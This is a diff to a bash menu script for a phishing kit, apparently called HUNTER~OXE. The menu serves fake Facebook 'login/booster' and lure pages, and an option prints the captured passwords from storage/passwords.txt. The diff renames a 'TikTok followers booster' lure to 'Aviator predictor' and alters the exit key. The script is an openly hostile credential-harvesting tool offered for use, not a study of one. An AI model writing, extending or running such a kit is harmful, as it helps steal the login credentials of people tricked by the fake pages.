@@ -42,7 +42,7 @@ echo -e "\e[1;37m  --------------------------------------------------"
 echo -e "\e[1;36m  [*] DEVELOPER : PHILLIMON ISAAC"
 echo -e "\e[1;37m  --------------------------------------------------"
 echo -e "\e[1;32m  [1] FACEBOOK LOGIN/BOOSTER"
-echo -e "\e[1;32m  [2] TIKTOK FOLLOWERS BOOSTER"
+echo -e "\e[1;32m  [2] AVIATOR PREDICTOR"
 echo -e "\e[1;32m  [L] VIEW CAPTURED DATA"
 echo -e "\e[1;31m  [CTRL+C] EXIT"
 echo -e "\e[1;37m  --------------------------------------------------"
@@ -52,7 +52,7 @@ case $choice in
     1) cp web/facebook.html web/index.html ;;
     2) cp web/tiktok.html web/index.html ;;
     L|l) clear; echo -e "\e[1;33m--- CAPTURED LOGS ---\e[0m"; cat storage/passwords.txt; read -p "Press Enter"; ./HUNTER~OXE.sh ;;
-    X|x) exit ;;
+    X|C) exit ;;
     *) ./HUNTER~OXE.sh ;;
 esac
 
